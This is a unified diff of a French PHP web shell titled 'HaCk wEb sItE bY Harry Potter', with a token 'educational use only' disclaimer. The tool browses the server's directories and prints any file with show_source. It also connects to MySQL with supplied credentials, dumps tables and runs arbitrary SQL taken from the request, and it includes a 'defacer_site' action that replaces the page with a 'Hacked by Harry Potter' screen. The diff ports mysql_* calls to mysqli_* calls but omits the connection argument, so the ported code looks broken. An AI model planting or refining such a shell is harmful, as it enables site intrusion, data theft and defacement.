@@ -1,7 +1,7 @@
 <?php
 
 	if(isset($_POST["dossier_nom"])){
-		$dossier_nom=$_POST["dossier_nom"];		
+		$dossier_nom=$_POST["dossier_nom"];
 	}else{
 		$dossier_nom = ".";
 	}
@@ -16,77 +16,77 @@
 		$bdd_host = "";
 		$bdd_bdd = "";
 	}
-	
+
 
 	echo "
 <style>
 input,select
 {
 	border:1px #00FF00 solid;
-	background-color:#000000; 
+	background-color:#000000;
 	color:#00FF00;
 }
-</style>	
-	
+</style>
+
 <body style=\"background-color:#000000; color:#00FF00;\">
 
 	<center><h2><font color=\"#00FF00\">HaCk wEb sItE bY</font> <font color=\"red\">Harry Potter</font></h2></center>
 	<hr color=\"#00FF00\">
-	
+
 	<blockquote>
 		Ce script est uniquement à usage pédagogique. Le créateur du script ne peut être tenu responsable de l'usage que vous en ferez.
 	</blockquote>
 
 	<form action=\"hack.php\" method=\"post\">
-	
+
 	<table width=\"80%\" align=\"center\" style=\"text-align:center\"><tr>
 	<td>
-	<center>	
-		Fichiers : 
+	<center>
+		Fichiers :
 		<select name=\"fic_nom\">
 	";
-	
+
 	// AFFICHAGE DE TOUS LES FICHIERS
-	if ($handle = opendir($dossier_nom)) { 
-		while (false !== ($file = readdir($handle))) 
-		{ 
+	if ($handle = opendir($dossier_nom)) {
+		while (false !== ($file = readdir($handle)))
+		{
 			if (((substr($file, 0, 1) != ".") || (substr($file, 0, 2) != "..")) && ((substr($file, strlen($file)-4, 1) == ".") || (substr($file, strlen($file)-3, 1) == ".")))
 			{
-				echo "<option value=\"" . $dossier_nom . "/" . $file . "\">" . $file . "</option>\n"; 
+				echo "<option value=\"" . $dossier_nom . "/" . $file . "\">" . $file . "</option>\n";
 			}
 		}
 	}
 
-			
+
 	echo "
 		</select><br><br>
-		
-		Dossiers : 
+
+		Dossiers :
 		<select name=\"dossier_nom\">
 		<option value=\"" . $dossier_nom . "\">Dossier en cours : " . $dossier_nom . "</option>
-		<option value=\".\">racine</option>	
+		<option value=\".\">racine</option>
 	";
-	
-	
+
+
 	// AFFICHAGE DE TOUS LES FICHIERS
-	if ($handle = opendir($dossier_nom)) { 
-		while (false !== ($file = readdir($handle))) 
-		{ 
+	if ($handle = opendir($dossier_nom)) {
+		while (false !== ($file = readdir($handle)))
+		{
 			if (((substr($file, 0, 1) != ".") || (substr($file, 0, 2) != "..")) && ((substr($file, strlen($file)-4, 1) != ".") && (substr($file, strlen($file)-3, 1) != ".")))
 			{
 				($file == $dossier_nom) ? $selected="selected" : $selected="" ;
-				echo "<option value=\"" . $file . "\" " . $selected . ">" . $file . "</option>\n"; 
+				echo "<option value=\"" . $file . "\" " . $selected . ">" . $file . "</option>\n";
 			}
 		}
 	}
 
-			
+
 	echo "
 		</select><br><br>
 
 		<input type=\"submit\" name=\"afficher_dossier\" value=\"afficher dossier\"> - <input type=\"submit\" name=\"afficher_fichier\" value=\"afficher fichier\"><br><br>
 	</td>
-	
+
 	<td>
 		<br><table align=\"center\">
 			<tr><td>Login</td><td><input type=\"text\" name=\"login\" value=\"" . $bdd_login . "\"></td></tr>
@@ -98,7 +98,7 @@ input,select
 		<br>
 		<input type=\"submit\" name=\"afficher_tables\" value=\"afficher la BDD\"> - <input type=\"submit\" name=\"afficher_table\" value=\"afficher la table\"><br>
 	</td>
-	
+
 	<td>
 		<br><br>
 		<textarea name=\"requete\" rows=\"6\"></textarea><br><br>
@@ -113,53 +113,54 @@ input,select
 	</table><br>
 	<hr color=\"#00FF00\">
 	</center>
-	
+
 	</form>";
 
-	
+
 // AFFICHAGE D'UN FICHIER
 if (isset($_POST["afficher_fichier"]))
 {
 	echo "&nbsp;&nbsp;<u>Affichage du fichier :</u>" . $_POST["fic_nom"];
-	
+
 	echo "<br><br><center><div style=\"background-color:#F3F085;border:1px #00FF00 solid;width:80%;text-align:left;\">";
 	show_source($_POST["fic_nom"]);
 	echo "</div></center>";
 
 }
-	
+
 // AFFICHAGE DES TABLES
 if (isset($_POST["afficher_tables"]))
 {
 
 	// Connexion a la BDD
-	@$connexion=mysql_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
-	$base=mysql_select_db($_POST["bdd"]);
-	
+	@$connexion=mysqli_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
+	$base=mysqli_select_db($_POST["bdd"]);
+
 	// Recuperation des tables
-	$les_tables = mysql_query("show tables");
-	
+	$les_tables = mysqli_query("show tables");
+
 	echo "<br><center><div style=\"background-color:#F3F085;border:1px #00FF00 solid;color:#000000;width:80%;text-align:left;\"><blockquote>";
-	
-	while ($une_table = mysql_fetch_array($les_tables))
+
+	while ($une_table = mysqli_fetch_array($les_tables))
 	{
 		// Recuperation des infos de la table en cours
-		$info_table=mysql_query("SELECT * FROM ". $une_table[0] ."");
-		
+		$info_table=mysqli_query("SELECT * FROM ". $une_table[0] ."");
+
 		// Recuperation du nb de champs de la table
-		$cols = mysql_num_fields($info_table);
-		
+		$cols = mysqli_num_fields($info_table);
+
 		echo "<b>";
 		echo strtoupper($une_table[0]);
 		echo "</b><br><blockquote>";
-		
+
 		// Affichage des champs et de leur type
 		for ($j = 0; $j < $cols; $j++) {
-			$type  = mysql_field_type($info_table, $j);
-			$name  = mysql_field_name($info_table, $j);
+            $finfo = mysqli_fetch_field_direct($info_table, $j);
+			$type  = $finfo->type;
+			$name  = $finfo->name;
 
 			echo "<font color=\"#OOOOAA\">" . $name . "</font> (<b>" . $type . "</b>)";
-			
+
 			echo "<br>";
 		}
 		echo "</blockquote><br>";
@@ -173,37 +174,38 @@ if (isset($_POST["afficher_table"]))
 {
 
 	// Connexion a la BDD
-	@$connexion=mysql_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
-	$base=mysql_select_db($_POST["bdd"]);
-	
+	@$connexion=mysqli_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
+	$base=mysqli_select_db($_POST["bdd"]);
+
 	// Recuperation des tables
-	$res_table = mysql_query("SELECT * FROM " . $_POST["table"]);
-	
+	$res_table = mysqli_query("SELECT * FROM " . $_POST["table"]);
+
 	echo "<br><center><div style=\"background-color:#F3F085;border:1px #00FF00 solid;color:#000000;width:80%;text-align:left;\"><blockquote>";
 
 	// Recuperation du nb de champs de la table
-	$cols = mysql_num_fields($res_table);
-	
+	$cols = mysqli_num_fields($res_table);
+
 	echo "<b>";
 	echo strtoupper($_POST["table"]);
 	echo "</b><br><table style=\"color:#000000;\">";
-	
+
 	// Affichage le nom des champs et de leur type
 	echo "<tr>";
-	for ($j = 0; $j < $cols; $j++) 
+	for ($j = 0; $j < $cols; $j++)
 	{
-		$type  = mysql_field_type($res_table, $j);
-		$name  = mysql_field_name($res_table, $j);
+		$finfo = mysqli_fetch_field_direct($res_table, $j);
+        $type  = $finfo->type;
+		$name  = $finfo->name;
 		echo "<td><font color=\"#OOOOAA\">" . $name . "</font> (<b>" . $type . "</b>)</td>";
 	}
 	echo "</tr>";
 	echo "<tr><td colspan=" . $cols . "><hr color=\"#000000\"></td></tr>";
-	
+
 	// On affiche les donnees
-	while ($une_donnee = mysql_fetch_array($res_table))
-	{	
+	while ($une_donnee = mysqli_fetch_array($res_table))
+	{
 		echo "<tr>";
-		for ($j = 0; $j < $cols; $j++) 
+		for ($j = 0; $j < $cols; $j++)
 		{
 			echo "<td>" . $une_donnee[$j] . "</td>";
 		}
@@ -213,18 +215,18 @@ if (isset($_POST["afficher_table"]))
 
 	echo "</blockquote></div></center>";
 }
-	
-	
+
+
 // EXECUTER UNE REQUETE
 if (isset($_POST["executer_requete"]))
 {
 
 	// Connexion a la BDD
-	@$connexion=mysql_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
-	$base=mysql_select_db($_POST["bdd"]);
-	
+	@$connexion=mysqli_connect($_POST["host"],$_POST["login"],$_POST["password"]) or die('Connexion impossible');
+	$base=mysqli_select_db($_POST["bdd"]);
+
 	// Recuperation des tables
-	$resultat = mysql_query($_GET["requete"]);
+	$resultat = mysqli_query($_GET["requete"]);
 	if($resultat)
 	{
 		echo "<font color=\"green\">Requête éxécutée avec succés</font>";
@@ -254,13 +256,13 @@ if (isset($_POST["defacer_site"]))
 		background:black;
 		color: #00FF00;
 		font-family:courier;
-	}    
+	}
 	blink{
 		display:inline;
 
 	}
 	</style>
-		
+
 	<script type='text/javascript'>
 	    var charIndex = -1;
 	    var stringLength = 0;
@@ -275,7 +277,7 @@ if (isset($_POST["defacer_site"]))
 	        }
 	        var initString = document.getElementById('myContent').innerHTML;
 			initString = initString.replace(/<SPAN.*$/gi,'');
-	        
+
 	        var theChar = inputText.charAt(charIndex);
 	       	var nextFourChars = inputText.substr(charIndex,4);
 	       	if(nextFourChars=='<BR>' || nextFourChars=='<br>'){
@@ -291,14 +293,14 @@ if (isset($_POST["defacer_site"]))
 	        }else{
 	             document.getElementById('blink').style.display='inline';
 	        }
-	                
+
 	        if(charIndex<=stringLength){
 	            setTimeout('writeContent(false)',150);
 	        }else{
 	        	blinkSpan();
-	        }  
+	        }
 	    }
-	    
+
 	    var currentStyle = 'inline';
 	    function blinkSpan(){
 	    	if(currentStyle=='inline'){
@@ -308,7 +310,7 @@ if (isset($_POST["defacer_site"]))
 	    	}
 	    	document.getElementById('blink').style.display = currentStyle;
 	    	setTimeout('blinkSpan()',500);
-	    	
+
 	    }
 	    </script>
 		<style type='text/css'>
@@ -322,7 +324,7 @@ if (isset($_POST["defacer_site"]))
 	<div id='contentToWrite' style='display: none;'>
 		<br><br><br><br><br>
 		Hacked by Harry Potter<br><br><br><br>
-		' Try to hack, secure the universe '<br>              
+		' Try to hack, secure the universe '<br>
 	</div>
 	</center>
 	<br><br><br>
@@ -355,4 +357,4 @@ if (isset($_POST["defacer_site"]))
 }
 	echo "</div>";
 
-?>  
+?>
